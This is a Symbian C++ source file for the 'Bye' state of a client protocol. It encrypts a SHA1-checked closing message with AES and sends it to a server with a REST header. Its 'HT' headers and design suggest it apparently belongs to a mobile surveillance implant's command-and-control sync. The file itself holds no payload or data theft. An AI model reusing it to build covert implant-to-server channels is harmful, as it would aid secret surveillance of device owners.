/*
 * StateBye.cpp
 *
 *  Created on: 16/feb/2011
 *      Author: Giovanna
 */

#include "StateBye.h"
#include "Keys.h"
#include <HT\ShaUtils.h>
#include <HT\AES.h>
#include <HT\RESTUtils.h>



CStateBye::CStateBye(MStateObserver& aObserver) : CAbstractState(EState_Bye, aObserver)
	{
	// No implementation required
	}

CStateBye::~CStateBye()
	{
	delete iRequestData;
	delete iResponseData;
	}

CStateBye* CStateBye::NewLC(MStateObserver& aObserver)
	{
	CStateBye* self = new (ELeave) CStateBye(aObserver);
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

CStateBye* CStateBye::NewL(MStateObserver& aObserver)
	{
	CStateBye* self = CStateBye::NewLC(aObserver);
	CleanupStack::Pop(); // self;
	return self;
	}

void CStateBye::ConstructL()
	{

	}

void CStateBye::ActivateL(const TDesC8& aData)
	{
	//Save the sign key
	iSignKey.Copy(aData);
	
	TBuf8<32> plainBody(KProto_Bye);
	_LIT8(KZero,"\x00\x00\x00\x00");
	plainBody.Append(KZero);
	// calculate SHA1
	TBuf8<20> sha;
	ShaUtils::CreateSha(plainBody,sha);
	//append SHA1
	plainBody.Append(sha);
	//encrypt
	RBuf8 buff(AES::EncryptPkcs5L(plainBody, KIV, iSignKey));
	buff.CleanupClosePushL();
	//add REST header
	HBufC8* header = iObserver.GetRequestHeaderL();
	TBuf8<32> contentLengthLine;
	contentLengthLine.Append(KContentLength);
	contentLengthLine.AppendNum(buff.Size());
	contentLengthLine.Append(KNewLine);
	iRequestData = HBufC8::NewL(header->Size()+contentLengthLine.Size()+KNewLine().Size()+buff.Size());
	iRequestData->Des().Append(*header);
	delete header;
	iRequestData->Des().Append(contentLengthLine);
	iRequestData->Des().Append(KNewLine);
	iRequestData->Des().Append(buff);
	CleanupStack::PopAndDestroy(&buff);
	
	iObserver.SendStateDataL(*iRequestData);
	}

void CStateBye::ProcessDataL(const TDesC8& aData) 
	{
	//free resources
	delete iRequestData;
	iRequestData = NULL;
	
	if(aData.Size()!=0)
		{
		if(iResponseData == NULL)
			{
			iResponseData = aData.AllocL();
			}
		else
			{
			TInt size = iResponseData->Size();
			iResponseData = iResponseData->ReAllocL(size+aData.Size()); //TODO:check the result of allocation
			iResponseData->Des().Append(aData);
			}
			return;
		}
		
	//this is useful only for debugging, since in real life we are leaving, so we are not
	//interested in parsing response
	/*
	if(iResponseData->Find(KApplicationOS)==KErrNotFound)
		{
		//server answered with a redirect
		//return;
		}
			
	//extract body from response
	RBuf8 body(CRestUtils::GetBodyL(*iResponseData));
	body.CleanupClosePushL();
		
	RBuf8 plainBody(AES::DecryptPkcs5L(body,KIV,iSignKey));
	CleanupStack::PopAndDestroy(&body);
	plainBody.CleanupClosePushL();
	//check sha1
	if(!ShaUtils::ValidateSha(plainBody.Left(plainBody.Size()-20),plainBody.Right(20)))
		{
		CleanupStack::PopAndDestroy(&plainBody);
		return;
		}
	//check response
	if(plainBody.Left(4).Compare(KProto_Ok) != 0)
		{
		CleanupStack::PopAndDestroy(&plainBody);
		return;
		}
	CleanupStack::PopAndDestroy(&plainBody);
	*/
	iObserver.ChangeStateL();    
		
	}

